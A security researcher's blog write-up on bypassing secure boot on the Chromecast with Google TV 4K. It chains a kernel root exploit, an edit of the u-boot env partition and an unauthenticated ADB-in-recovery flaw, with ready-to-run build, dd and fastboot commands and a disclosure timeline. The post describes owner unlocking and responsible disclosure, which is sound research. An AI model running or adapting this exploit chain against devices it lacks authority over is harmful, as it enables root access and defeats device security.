---
layout: post
title: "Chromecast with Google TV (4K) - Persistent Secure Boot Bypass (v2!)"
date: 2026-10-26
---

## [oops i did it again](https://youtu.be/CduA0TULnow?t=86) - [sabrina-unlock-v2](https://github.com/oddsolutions/sabrina-unlock-v2)

But first...

## where u been?

Been a while since we've talked! Sorry about that.

I've been busy in (practice-)management land at [LevelBlue](https://www.levelblue.com/) lately, and honestly, I am *loving it*. Building a team, mentoring others, and helping people find their footing in the product (hardware/firmware) security field has been one of the most rewarding parts of my career.

![](https://i.imgur.com/lE5I1Sk.png)

There's something uniquely satisfying about watching someone grow, seeing the pieces click, their confidence build, and eventually watching them turn around and start developing new, novel attack methods or exploitation methods.

As it turns out, though, management hasn't managed to cure that itch to... _break things_.

While going through some bins and revisiting old memories I cam across a stack of Chromecast with Google TV 4K  (`sabrina`) device's on disparate firmware revisions and configurations.

Jan Altensen (AKA [Stricted](https://github.com/Stricted)) and I used Frederic Basse's [AMLogic BootROM (BL1)](https://fredericb.info/2021/02/amlogic-usbdl-unsigned-code-loader-for-amlogic-bootrom.html) exploit to [break secure-boot on this device](https://oddsolutions.github.io/Chromecast-with-Google-TV-Bootloader-Unlock/) back in... 2021. _Good GOD_ time flies.

I booted one of the devices and OTA updated to the latest build `google/sabrina_prod_stable/sabrina:14/UTTC.250917.004/14193937:user/release-keys`, which has a security patch level of `2025-10-01`.

That's relatively out of date...

![](https://i.pinimg.com/736x/f1/c1/a3/f1c1a31eb1c44940707c9eae3710e2f0.jpg)

# Standard Disclaimer

This is documentation of work done on *my own* hardware. You are solely responsible for any potential damage(s) caused to your device. This *will* wipe `/data` — that part isn't optional, and I'll explain why below.

# Exploit Resources

- [sabrina-unlock-v2](https://github.com/oddsolutions/sabrina-unlock-v2)

To unlock your device, open a terminal and run:

````bash
git clone https://github.com/oddsolutions/sabrina-unlock-v2
cd sabrina-unlock-v2
./unlock.sh
````

Now, follow the onscreen instructions. That simple!

**<u>Important Note</u>:** Do **not** try to flash LineageOS 22.2 build on the device in this state! You _will_ brick.

LineageOS 22.2 `sabrina` builds is designed for the older Android 12 bootloader, and as such flashes the matching bootloader.

Anti-Rollback (ARB) **will brick your device** if you flash LineageOS 22.2 builds.

We are actively working on LineageOS 24.0 utilizing the Android 14 bootloader and Linux 5.15, but it is not ready yet - no ETA either.

# Whitepaper

## Background

Our first pass at bypassing secure boot on this device utilized a vulnerability in the BootROM (BL1, which though still present we can no longer trigger. First let's assess the unlock mechanism and make sure it still looks familiar.

Many newer or updated AMLogic devices have moved away from respecting u-boot's `lock` variable and instead route unlock requests through BL31 and use RPMB to store the state.

Good news: on `sabrina`'s latest Android 14 bootloader (`UTTC.250917.004`), the lock state is *not* in RPMB. That's the newer X4/Y4 (`s4`/`t7`/`sc2` - "NE") generation for the most part. `sabrina`'s s905d3g SoC (and the rest of the `X`/`X2``/Y2``/X3` "`gx*`/`g12*`" crowd) reads it straight out of the u-boot environment, via `get_lock_data()` → `getenv("lock")`, with `CONFIG_AML_ANTIROLLBACK` and `CONFIG_AML_PRODUCT_MODE` not enabled.

So, the underlying bootloader lock/unlock mechanism hasn't changed all that much. To refresh everyone on it the `lock` variable  is an 8-char serialization of LockData_t, one digit per byte. `LockData_t` is `8` × `uint8_t`, and it's serialized/parsed as one ASCII decimal digit per byte:

```c
typedef struct LockData {
	uint8_t version_major;
	uint8_t version_minor;
	uint8_t unlock_ability;
	/* Padding to eight bytes. */
	uint8_t reserved1;
	/* 0: unlock    1: lock*/
	uint8_t lock_state;
	/* 0: unlock    1: lock*/
	uint8_t lock_critical_state;
	/* 0: enable bootloader version rollback 1: prevent bootloader version rollback*/
	uint8_t lock_bootloader;
	uint8_t reserved2[1];
} LockData_t;
```

"Bootloader Unlocked" as the user would understand it would imply the following values: `unlock_ability=1`, `lock_state=0`, `lock_critical_state=0`. 

So `lock=10001110` becomes `lock=10100010`.

We _could_ desolder the eMMC and write these values, or even do some fun eMMC interpolation. I may write this method up in the future - but where is the fun in that! I want average people to be able to unlock their devices.

## I am (g)root

[GhostLock](https://nvd.nist.gov/vuln/detail/cve-2026-43499) is the current hot-ness for getting temporary root and disabling SELinux on modern-ish Android devices, and this device utilizes Linux `5.10.170` on Android Security Patch Level `2025-10-01` which _should_ be vulnerable.

And quite luckily [k-o-n-t-o-r](https://github.com/k-o-n-t-o-r) - and by their own credits, Claude and GLM already ported the exploit to `UTTC.250917.004`!

It's /fairly/ reliable as well.

Simply download the Android NDK ([r30 as of writing](https://dl.google.com/android/repository/android-ndk-r30-linux.zip)), extract, and set the enviorment variable `ANDROID_NDK_HOME` to the extracted path.

Then `cd` to the repository, run `make`, push the build artifact to the device and execute it - that simple!

Hook the device up to your computer with a USB-C to C cable (as USB-A to C results in the "Insufficient Power" boot screen), enable ADB in Developer Settings, and authenticate ADB when prompted.

```bash
#!/bin/bash
set -e
# Clone the kernel exploit
git clone https://github.com/k-o-n-t-o-r/ghostlock-sabrina -b main
cd ghostlock-sabrina

# Download and extract the Android NDK
wget -q https://dl.google.com/android/repository/android-ndk-r30-linux.zip
unzip -q android-ndk-r30-linux.zip
rm android-ndk-r30-linux.zip

# Configure paths
export ANDROID_NDK_HOME="$PWD/android-ndk-r30"

# Build the kernel exploit
make -j4

# Push and execute the kernel exploit
adb push ghostlock /data/local/tmp/
adb shell "cd /data/local/tmp && ./ghostlock --cred"
```

You may need to power cycle the device and try a few times, but ultimately you'll see something resembling the following snippet:

```log
--- battery ---
selinux=kernel
stdout_write_ret=13
file_create=OK
uid=0 hits=3/3
kallsyms: trying open...
kallsyms: OPEN OK, scanning...
[!] partial plan (hits=3/3) - skipping exec (commit_creds BUG_ON guard); battery written
```

Once you see something resembling that snippet, despite the lack of indication you are most likely in a root `sh` shell.

You can confirm this by running `id` and observing output of `uid=0(root)`, as well as running `getenforce` and observing output of `Permissive`.

This shell can be tempermental, so if things crash or the device stops responding, just power cycle the device and start again!

## Patching the env

The env partition contains two redundant 64 KiB copies (at `0x0` and `0x10000`). Despite what the board header *claims*, at least on my device the on-disk format was the plain non-redundant layout:

- `[0x0:0x4]` — little-endian CRC32
- `[0x4:0x10000]` — the NUL-separated `key=val` blob, and the CRC is computed over exactly this range

So the job is: flip three bits, recompute `crc32` over `[0x4:0x10000]`, drop it in little-endian at the front, repeat for the copy at `0x10000` if it exists.. I wrote [a little script](https://github.com/oddsolutions/sabrina-unlock-v2) so you don't have to do this by hand.

It finds `lock=` as a whole variable (so it won't trip over `unlock=` or `lock_*`), only touches the leading copies that actually contain it, and leaves the 8 MB of padding alone.

Since I was already modifying the `env` image to flip the lock bits, I made some other QOL improvements:

1. By default `bootdelay=0` which means u-boot sprints past the point where you could access an interactive console
   - Bumped it to `bootdelay=3` in case you need to repair the device

2. The "Pairing" button (`GPIOAO_10` ), which by default acts as the `upgrade_key` and boots the device into USB recovery/"burn mode", which unfortunately wants a password file provided to authenticate before any actions can be taken
   -  Swapped `upgrade_key=if gpio input GPIOAO_10; then echo GPIOAO_10 pressed;if usb start 0; then run recovery_from_udisk;fi;fi;` -> `upgrade_key=if gpio input GPIOAO_10; then echo GPIOAO_10 pressed;fastboot;fi;`
   -  If you connnect a USB C to C data cable to the device, count out 1 full second, then press and hold the "Pairing" button you will now enter bootloader (fastboot) mode
      -  From which you can boot to recovery via `fastboot reboot recovery`, interact with `burn` mode via `fastboot oem` commands, and re-flash the device via `fastboot flash` to your heart's content

In the GhostLock root shell:

```bash
# Dump current env off the device
dd if=/dev/block/platform/ffe07000.emmc/by-name/env of=/data/local/tmp/env.img
```

In a fresh shell on your host machine:

```bash
# Pull the current env off the device
adb pull /data/local/tmp/env.img
# Download the patching script
wget https://raw.githubusercontent.com/oddsolutions/sabrina-unlock-v2/main/scripts/patch_env_unlock.py
# Patch the env image
# -> lock 10001110 -> 10100010, both copies, CRCs fixed and verified
python3 patch_env_unlock.py env.img -o env-unlocked.img
# Push the patched env image to the device
adb push env-unlocked.img /data/local/tmp
```

Back in the GhostLock root shell:

```bash
dd if=/data/local/tmp/env-unlocked.img of=/dev/block/platform/ffe07000.emmc/by-name/env
```

At this point the device may show a blank black screen and be unresponsive. ADB commands won't function anymore - including reboot commands, they just hang.

At this point, thanks to our creative `env` patching, you can power cycle the device, and the second the orange light comes on, long press the "Pairing" button until you see the device enumerate in bootloader mode over USB via `fastboot devices`.

If you see `GX-CHIP` enumerate, you are holding the button too early, power cycle and try again waiting an extra second.

If the device now shows up in `fastboot devices` you can skip to [Calling off the Rescue Party](#calling-off-the-rescue-party). If it doesn't after a few tries, continue to the next header.

## An additional finding (a.k.a. why it "didn't work" for two hours)

This was part of the original chain - but isn't needed with the advent of patching `env` to enable UART shell + bootloader `fastboot` access.

But, if for some reason your unit isn't able to get into bootloader mode via the button press you can follow these steps.

I'm honestly unsure what differentiates units that have, and don't have this issue, but at least one person testing this noted that they couldn't get to bootloader mode via the button press.

Write the patched env back, reboot, and... you immediately are looped into recovery as part of Android's [Rescue Party](https://source.android.com/docs/core/tests/debug/rescue-party)"= feature as the system is unable to unlock the FBE userdata after the bootloader lock status changed. 

Userdata is FBE-encrypted, and those keys are bound to the **[Android Verified Boot (AVB)](https://source.android.com/docs/security/features/verifiedboot) root of trust**, which *includes the lock state*. Unlock the device by any means and the bootloader will start advertising `androidboot.verifiedbootstate=orange`. The device happily boots (AVB gets ignored, because unlocked), but then vold can't derive the old keys, `/data` won't mount, the framework crash-loops, and RescueParty is initiated, which reboots the user to recovery with the `--reason=rescueparty` option.

In this mode only two options are shown on-screen "Try Again" which will loop you back to this same screen, and "Factory Data Reset" which will wipe the `userdata`, `cache`,and `metadata` partitions - but **also** reset's `env` to to lock the bootloader and reset `unlock_abillity`.

One might think "well, just use the key combination to boot to bootloder mode directly!" except that does not exist on `sabrina`. Holding the pairing button on the device while connecting to either power or data lands you in the password-protected BootROM (BL1) mode which we can't interact with.

There is no key combination to get into bootloader mode, and we're already in recovery with a hardcoded boot-reason of `rescueparty`.

We've landed in a bit of a catch-22. We can unlock but we can't _stay_ unlocked and actually use the device.

## What in the world...

While in recovery, ADB is normally either disabled, or unauthorized. It is only enabled and allowed in `sideload` mode to serve signed OTA packages.

But...

```bash
$ adb devices
0A311HFDD0V46V	recovery
```

For a reason I still don't fully understand (TODO: Crack this), when this device is in recovery mode _and_ the reboot reason includes `rescueparty` the device allows unauthenticated ADB access. That can't be intended.

```bash
$ adb shell
adbd F 01-01 00:02:00   162   162 shell_service.cpp:380] Could not set SELinux context for subprocess
libc: Fatal signal 6 (SIGABRT), code -1 (SI_QUEUE) in tid 162 (adbd), pid 162 (adbd)
```

So, SELinux blocks a full interactive shell or commands executed through that venue... but what if we get more rudimentary:

````bash
$ adb reboot recovery
````

Oh, sweet, that works! But still in Rescue Party... let's try some other boot options:

````bash
$ adb reboot bootloader
````

Lands us back in recovery as BCB seemingly can't be modified like that while in Rescue Party. But what if we didn't reset/reboot? What if we used a different mode available via warm-boot?

```bash
$ adb reboot fastboot
```

This immediately swapped us over to the `fastbootd` menu and exposed `fastboot` commands - sweet!

At this point we can _actually_ reboot to bootloader via `fastboot reboot bootloader`.

## Calling off the Rescue Party

Now, let's clear that pesky Rescue Party status and `userdata` without resetting `env`:

```bash
$ fastboot -w
Erasing 'userdata'                                 OKAY [  0.291s]
mke2fs 1.46.6 (1-Feb-2023)
Creating filesystem with 1097212 4k blocks and 274720 inodes
Filesystem UUID: 99208ad8-4253-4be6-ac7e-4af7acba4ef5
Superblock backups stored on blocks:
	32768, 98304, 163840, 229376, 294912, 819200, 884736

Allocating group tables: done
Writing inode tables: done
Creating journal (16384 blocks): done
Writing superblocks and filesystem accounting information: done

Warning: skip copying userdata image avb footer due to sparse image.
Sending 'userdata' (2260 KB)                       OKAY [  0.107s]
Writing 'userdata'                                 OKAY [  0.139s]
Erasing 'cache'                                    OKAY [  0.050s]
mke2fs 1.46.6 (1-Feb-2023)
Creating filesystem with 204800 4k blocks and 51296 inodes
Filesystem UUID: f87dd85d-36ba-482b-b40d-0995a8f16e03
Superblock backups stored on blocks:
	32768, 98304, 163840

Allocating group tables: done
Writing inode tables: done
Creating journal (4096 blocks): done
Writing superblocks and filesystem accounting information: done

Warning: skip copying cache image avb footer due to sparse image.
Sending 'cache' (476 KB)                           OKAY [  0.032s]
Writing 'cache'                                    OKAY [  0.058s]
Erasing 'metadata'                                 OKAY [  0.025s]
mke2fs 1.46.6 (1-Feb-2023)
Creating filesystem with 4096 4k blocks and 4096 inodes

Allocating group tables: done
Writing inode tables: done
Creating journal (1024 blocks): done
Writing superblocks and filesystem accounting information: done

Warning: skip copying metadata image avb footer due to sparse image.
Sending 'metadata' (52 KB)                         OKAY [  0.014s]
Writing 'metadata'                                 OKAY [  0.040s]
Finished. Total time: 1.202s
```

Annnnnd now we just check that the device is still unlocked:

````bash
$ fastboot getvar unlocked
unlocked: yes
````

Epic. Now, purely for testing I booted an unpacked/repacked boot image so the signature would be invalidated:

```bash
$ fastboot boot boot-modified.img
Sending 'boot.img' (24576 KB)                      OKAY [  1.055s]
Booting                                            OKAY [  0.001s]
Finished. Total time: 1.077s
```

The device booted up to SetupWraith and I was able to proceed with device setup.

I then re-enabled ADB and entered a local shell to confirm unlock status:

```bash
sabrina:/ $ getprop ro.boot.vbmeta.device_state
[ro.boot.vbmeta.device_state]: unlocked
```



# Disclosure, Impact, and Coordination 

## Impact - AKA "Does this work on my $randomDevice"

In short, probably, if your patch level is anything prior to `2026-08-01`, you can likely port GhostLock to your device (or bribe an unrestricted LLM to do so), and then utilize the `--unlock-only` flag on the `patch_env_unlock.py` script to unlock the bootloader.

I wouldn't run `unlock.sh`, as it does a number of `sabrina` specific things, but the overarching idea will apply to pretty much all Linux `5.15` AMLogic `gx*`/`g12*`/`sm1` devices.

## Disclosure Timeline

- 25-OCT-2026 - Initial report draft sent to Google
  - Note: The only novel part of this that requires disclosure is the fact that ADB is unauthenticated in recovery when Rescue Party is active, and the lack of a signature on the env partition, which I've argued is inherently vulnerable for years.

- 26-OCT-2026 - Initial writeup and resource publication
  - This is non-standard for VRP (usually 90 days) but:
    - GhostLock/`env` patching are posted by someone else on XDA for a public audience, so aren't part of the disclosure technically
    - I alerted Google that the vulnerabilities were being actively chained together
    - The existing exploit attempts unlock the device but expose no method for the user to recover a bricked device, we have already seen at least 2 - whereas my version enables bootloader `fastboot` access on "Pairing" button press
    - I've assessed the impact of ADB being enabled and unauthenticated (without interactive shell) in rescue mode to be rather low
  - With all of the above combined, I decided to release this out-of-cycle with usual VRP disclosure timelines

## CVE Tracking

- (Likely) N/A - See [Disclosure Timeline](#disclosure-timeline)

## Credits

- Nolen Johnson (npjohnson): Theorizing, developing, and chaining together these vulnerabilities into an exploit chain.
- [k-o-n-t-o-r](https://github.com/k-o-n-t-o-r) (and Claude) for their awesome sabrina-tailored [GhostLock implementation](https://github.com/k-o-n-t-o-r/ghostlock-sabrina).
- BigEmpty @ XDA - The pointer on the dual environments contained in the `env` image, as well as confirming CRC calculation methods
- P0werpl @ XDA - Pointing me at the GhostLock implementation and testing the patching method
- Brian Light - Whitepaper QA/Review

## Special Thanks

- My product security consulting team at [LevelBlue](https://www.levelblue.com/) - So proud of the amazing team we're building, and the amazing team members

## Contribute to FOSS development on this device

- U-Boot: [sabrina-uboot](https://github.com/oddolutions/android_external_u-boot)
- Android: [android_device_google_sabrina](https://github.com/LineageOS/android_device_google_sabrina)
- GNU/Linux: [sabrina-linux](https://github.com/frederic/sabrina-linux)
